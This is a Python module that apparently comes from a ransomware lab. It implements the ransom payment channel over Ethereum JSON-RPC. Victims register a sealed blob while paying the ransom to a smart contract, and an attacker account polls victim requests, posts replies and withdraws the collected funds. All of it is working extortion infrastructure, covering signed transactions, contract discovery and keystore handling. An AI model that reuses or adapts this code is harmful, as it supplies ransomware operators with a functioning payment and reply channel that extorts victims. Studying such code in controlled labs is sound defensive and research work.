"""Raw RansomExchange transport: signed transactions + eth_call over JSON-RPC.

Ported from the WannaCry v2 lab (ransom_chain.py), minus everything that knew
about ransomware keys: requests and replies are opaque bytes here.
Uses eth-account / eth-abi / eth-utils only; no web3 client in containers.
"""

import json
import time
from pathlib import Path
from urllib.request import Request, urlopen

from eth_abi import decode as abi_decode, encode as abi_encode
from eth_account import Account
from eth_utils import keccak

from software.ransom_payment.runtime import wallet

SELECTOR_REGISTER = keccak(text="registerVictim(bytes)")[:4]
SELECTOR_SUBMIT_REPLY = keccak(text="submitReply(uint256,bytes)")[:4]
SELECTOR_GET_REPLY = keccak(text="getReply(uint256)")[:4]
SELECTOR_REQUESTS = keccak(text="requests(uint256)")[:4]
SELECTOR_ATTACKER = keccak(text="attacker()")[:4]
SELECTOR_WITHDRAW = keccak(text="withdraw()")[:4]
EVENT_REGISTERED = keccak(text="VictimRegistered(uint256,address)")

# Storing ~1.4 KB of sealed blob per request costs roughly 1M gas in SSTORE
# writes; a ~1.7 KB reply costs ~1.2M. Both stay well below the block limit.
GAS_REGISTER = 3000000
GAS_REPLY = 4000000
POLL_SECONDS = 5
RECEIPT_TIMEOUT = 120


def discover_contract(config: dict) -> str:
    """Read the deployed contract address from the utility info server."""
    url = f"{config['utility_url']}/contracts_info?name={config['contract_name']}"
    request = Request(url, headers={"Content-Type": "application/json"})
    with urlopen(request, timeout=5) as response:
        result = json.load(response)

    address = None
    if isinstance(result, str):
        address = result
    elif isinstance(result, dict):
        entry = result.get(config["contract_name"], result.get("address"))
        if isinstance(entry, dict):
            address = entry.get("contractAddress") or entry.get("address")
        else:
            address = entry
    if not address:
        raise RuntimeError("utility server returned no contract address")
    return wallet.validate_address(address)


def code_size(config: dict, address: str) -> int:
    code = wallet.rpc(config, "eth_getCode", [address, "latest"])
    return (len(code) - 2) // 2


def load_wallet_key(keystore_path: Path, password: str):
    """Decrypt a wallet keystore in memory; the key never touches disk."""
    keystore = json.loads(keystore_path.read_text(encoding="utf-8"))
    return Account.from_key(Account.decrypt(keystore, password))


def send_tx(config: dict, account, to: str, value: int, data: bytes, gas: int):
    """Build, sign, and submit one real transaction; return its hash."""
    nonce = int(wallet.rpc(config, "eth_getTransactionCount", [account.address, "pending"]), 16)
    gas_price = int(wallet.rpc(config, "eth_gasPrice", []), 16)
    tx = {
        "to": to, "value": value, "gas": gas, "gasPrice": gas_price,
        "nonce": nonce, "chainId": config["chain_id"], "data": data,
    }
    signed = account.sign_transaction(tx)
    raw = getattr(signed, "raw_transaction", None) or signed.rawTransaction
    raw_hex = raw.hex()
    if not raw_hex.startswith("0x"):
        raw_hex = "0x" + raw_hex
    return wallet.rpc(config, "eth_sendRawTransaction", [raw_hex])


def wait_receipt(config: dict, tx_hash: str, timeout: int = RECEIPT_TIMEOUT) -> dict:
    """Poll for the transaction receipt; no result before it is mined."""
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        receipt = wallet.rpc(config, "eth_getTransactionReceipt", [tx_hash])
        if receipt is not None:
            if int(receipt["status"], 16) != 1:
                raise RuntimeError(f"transaction reverted on-chain: {tx_hash}")
            return receipt
        time.sleep(POLL_SECONDS)
    raise TimeoutError(f"receipt not seen within {timeout}s: {tx_hash}")


def call_single(config: dict, to: str, selector: bytes, arg: int, out_types: list):
    """One eth_call with a uint256 argument; None when reverted or empty."""
    data = "0x" + (selector + abi_encode(["uint256"], [arg])).hex()
    try:
        result = wallet.rpc(config, "eth_call", [{"to": to, "data": data}, "latest"])
    except RuntimeError as error:
        if "execution reverted" in str(error):
            return None
        raise
    if result in (None, "0x") or len(result) < 10:
        return None
    return abi_decode(out_types, bytes.fromhex(result[2:]))


def extract_request_id(receipt: dict) -> int:
    for log in receipt.get("logs", []):
        topics = log.get("topics", [])
        if topics and bytes.fromhex(topics[0][2:]) == EVENT_REGISTERED:
            return int(topics[1], 16)
    raise RuntimeError("registration receipt had no VictimRegistered event")


def register_and_pay(config: dict, account, blob: bytes) -> dict:
    """registerVictim(blob) with exactly the ransom attached."""
    address = discover_contract(config)
    # Never attach value to a target without code: a failed deployment leaves
    # a dead address, and a payment to it would be an unrecoverable donation.
    if code_size(config, address) <= 0:
        raise RuntimeError(
            f"no contract code at {address}; the deployment failed. "
            "Refusing to pay a ransom into a dead address."
        )
    data = SELECTOR_REGISTER + abi_encode(["bytes"], [blob])
    tx_hash = send_tx(config, account, address, value=config["ransom_wei"], data=data,
                      gas=GAS_REGISTER)
    receipt = wait_receipt(config, tx_hash)
    return {"transaction_hash": tx_hash, "contract_address": address,
            "request_id": extract_request_id(receipt)}


def get_reply(config: dict, request_id: int):
    address = discover_contract(config)
    result = call_single(config, address, SELECTOR_GET_REPLY, request_id, ["bytes"])
    return bytes(result[0]) if result and result[0] else None


def poll_requests(config: dict, start_id: int = 0) -> list:
    """Read all requests from the chain with payment and answer state."""
    address = discover_contract(config)
    found = []
    next_id = start_id
    while True:
        result = call_single(config, address, SELECTOR_REQUESTS, next_id,
                             ["address", "bytes", "bool"])
        if result is None:
            break
        victim, blob, answered = result
        if int(victim, 16) == 0:
            break  # unmapped id: end of registered requests
        found.append({"id": next_id, "victim": victim, "blob": bytes(blob),
                      "answered": answered})
        next_id += 1
    return found


def onchain_attacker(config: dict) -> str:
    address = discover_contract(config)
    data = "0x" + SELECTOR_ATTACKER.hex()
    raw = wallet.rpc(config, "eth_call", [{"to": address, "data": data}, "latest"])
    return abi_decode(["address"], bytes.fromhex(raw[2:]))[0]


def submit_reply(config: dict, account, request_id: int, reply: bytes) -> str:
    address = discover_contract(config)
    data = SELECTOR_SUBMIT_REPLY + abi_encode(["uint256", "bytes"], [request_id, reply])
    tx_hash = send_tx(config, account, address, value=0, data=data, gas=GAS_REPLY)
    wait_receipt(config, tx_hash)
    return tx_hash


def withdraw(config: dict, account) -> str:
    address = discover_contract(config)
    tx_hash = send_tx(config, account, address, value=0, data=SELECTOR_WITHDRAW, gas=100000)
    wait_receipt(config, tx_hash)
    return tx_hash
